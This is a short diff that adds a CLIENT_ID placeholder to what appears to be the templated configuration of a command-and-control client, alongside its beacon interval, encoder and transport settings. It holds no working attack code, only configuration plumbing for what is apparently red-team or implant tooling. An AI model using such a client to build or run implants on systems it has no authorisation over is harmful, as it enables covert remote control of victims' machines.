@@ -24,6 +24,9 @@ IDLE_TIME = ```[var:::c2_block_time]```
 ENCODER_MODULE = ```[var:::encoder]```
 TRANSPORT_MODULE = ```[var:::transport]```
 
+# ID that you want to assign to the client
+CLIENT_ID = ```[var:::client_id]```
+
 ###########################################
 # DEBUG: </END GHETTO CONFIG>
 
